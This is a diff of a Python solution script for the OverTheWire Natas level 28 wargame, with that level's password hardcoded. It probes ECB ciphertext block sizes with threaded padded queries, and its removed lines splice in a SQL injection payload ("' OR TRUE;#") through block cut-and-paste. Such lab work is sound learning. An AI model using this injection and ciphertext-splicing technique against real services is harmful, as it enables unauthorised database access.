@@ -2,6 +2,8 @@ from bs4 import BeautifulSoup
 import requests
 import urllib.parse
 import base64
+import concurrent.futures
+
 
 def make(url, auth, my_params):
     res = requests.get(url=url,auth=lvl_pass, params=my_params)
@@ -21,12 +23,18 @@ def recipher(decStr):
 def urlQuery(url, auth, my_params):
     return decipher(make(url,auth,my_params).url[60:])
 
+def numToCode(x):
+    return [x,urlQuery(url, lvl_pass, {'query':'%'*x})]
+
 lvl_name = 'natas28'
 lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
 url = f'http://{lvl_name}.natas.labs.overthewire.org'
+NUM_CODES=50
+BLOCK_SIZE=16
 
-res1= urlQuery(url, lvl_pass, {"query":"X"*12})
+with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CODES) as executor:
+    codes = [x for x in executor.map(numToCode, list(range(NUM_CODES+1)))]
 
-res2=urlQuery(url, lvl_pass, {"query":"X"*11 + r"\' OR TRUE;#"})
-
-print(recipher(res1[:-32]+res2[-32:]))
+for x in codes:
+    space_x = ' '.join([x[1][i:i+(BLOCK_SIZE*2)] for i in range(0, len(x[1]), BLOCK_SIZE*2)])
+    print(f'{x[0]:2}  -->    {len(x[1]):5}: {space_x}')
